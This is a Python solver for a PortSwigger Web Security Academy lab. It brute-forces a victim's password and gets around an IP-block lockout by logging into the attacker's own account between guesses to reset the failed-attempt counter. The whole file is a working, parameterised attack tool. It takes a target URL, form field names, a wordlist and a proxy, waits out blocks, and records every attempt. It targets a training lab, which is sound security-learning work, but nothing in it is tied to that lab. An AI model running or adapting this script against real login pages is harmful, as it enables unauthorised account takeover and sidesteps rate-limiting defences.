#!/usr/bin/env python3
"""
Broken brute-force protection, IP block (PortSwigger lab solver).

Lab logic:
  - 3 failed logins in a row -> your IP is blocked for 1 minute.
  - The failed-attempt counter resets whenever you log in successfully.
  - So: before every guess against the victim, log in with your own account to
    reset the counter. That keeps the counter at 1 and never trips the block.

Attack:
    for each candidate password:
        POST /login  username=<self>  password=<self-pass>   # valid -> counter reset
        POST /login  username=<victim> password=<guess>      # 302 = solved

No hardcoded credentials: self user/pass and victim come from CLI flags.
Wordlists come from files (default passwords.txt).

Usage:
  python3 ai-tools/portswigger/broken_bruteforce_ip_block.py \
      --url https://<id>.web-security-academy.net/login \
      --cookie "session=..." \
      --self-user wiener --self-pass peter \
      --victim carlos \
      --passwords passwords.txt

  ... --max-fails 2        # reset before counter reaches this (default 2)
  ... --delay 0.2          # seconds between requests
  ... --verbose            # show status per attempt
  ... --csv attempts.csv
  ... --proxy http://127.0.0.1:8080
"""
from __future__ import annotations

import argparse
import csv
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)

BLOCK_RE = re.compile(r'too many incorrect login attempts', re.I)


def load_list(path: Path) -> list[str]:
    out, seen = [], set()
    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
        s = line.strip()
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        description='Broken brute-force protection (IP block) lab solver.')
    ap.add_argument('--url', required=True, help='https://<id>.web-security-academy.net/login')
    ap.add_argument('--cookie', default='', help='session cookie value')
    ap.add_argument('--self-user', required=True, help='your own username (counter reset)')
    ap.add_argument('--self-pass', required=True, help='your own password')
    ap.add_argument('--victim', required=True, help="victim's username")
    ap.add_argument('--passwords', default='passwords.txt')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--max-fails', type=int, default=2,
                    help='reset the counter before this many consecutive failures (default 2)')
    ap.add_argument('--user-agent', default='Mozilla/5.0 (BruteForceProtection)')
    ap.add_argument('--proxy', default='')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--insecure', action='store_true')
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--csv', default='')
    args = ap.parse_args()

    passwords = load_list(Path(args.passwords))
    if not passwords:
        print('error: password wordlist is empty', file=sys.stderr)
        return 2

    s = requests.Session()
    s.headers.update({
        'User-Agent': args.user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    if args.cookie:
        s.headers['Cookie'] = args.cookie

    p = urlparse(args.url)
    vhost = f'{p.scheme}://{p.netloc}'
    s.headers['Origin'] = vhost
    s.headers['Referer'] = vhost + '/login'

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    verify = not args.insecure

    rows: list[tuple[str, str, str, int, str]] = []

    def post(user: str, pwd: str):
        try:
            r = s.post(args.url,
                       data={args.user_field: user, args.pass_field: pwd},
                       timeout=args.timeout, allow_redirects=False,
                       proxies=proxies, verify=verify)
        except RequestException as e:
            print(f'[!] request error ({user}) -> {e}', file=sys.stderr)
            time.sleep(1)
            return None
        if args.delay:
            time.sleep(args.delay)
        return r

    def reset_counter() -> bool:
        """Log in with your own account to reset the failed-attempt counter."""
        r = post(args.self_user, args.self_pass)
        if r is None:
            return False
        ok = r.status_code in (301, 302, 303, 307, 308)
        rows.append(('reset', args.self_user, args.self_pass, r.status_code,
                     r.headers.get('Location', '')))
        if args.verbose:
            print(f'    reset    {args.self_user:<10s} status={r.status_code} '
                  f'{r.headers.get("Location", "")}', file=sys.stderr)
        return ok

    # make sure we start from a clean counter
    reset_counter()

    print(f'[*] victim={args.victim} passwords={len(passwords)} '
          f'reset_user={args.self_user}', file=sys.stderr)

    fails = 0
    hit = None
    for i, pw in enumerate(passwords, 1):
        r = post(args.victim, pw)
        if r is None:
            continue
        body = r.text or ''
        status = r.status_code
        loc = r.headers.get('Location', '')
        rows.append(('guess', args.victim, pw, status, loc))

        if status in (301, 302, 303, 307, 308):
            print(f'[+] HIT {args.victim}:{pw} status={status} {loc}', file=sys.stderr)
            hit = pw
            break

        if BLOCK_RE.search(body):
            print(f'[-] IP blocked at attempt {i}; waiting 60s', file=sys.stderr)
            rows.append(('blocked', args.victim, pw, status, ''))
            time.sleep(60)
            reset_counter()
            fails = 0
            continue

        fails += 1
        if args.verbose:
            print(f'    [{i:3d}] {pw:<14s} status={status} fails={fails}', file=sys.stderr)
        elif i % 10 == 0:
            print(f'[*] {i}/{len(passwords)} tried', file=sys.stderr)

        if fails >= args.max_fails:
            reset_counter()
            fails = 0

    if args.csv:
        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(('action', 'user', 'password', 'status', 'location'))
            w.writerows(rows)
        print(f'[*] CSV: {args.csv}', file=sys.stderr)

    if hit:
        print(f'HIT {args.victim}:{hit}')
        return 0
    print('[-] password not found', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())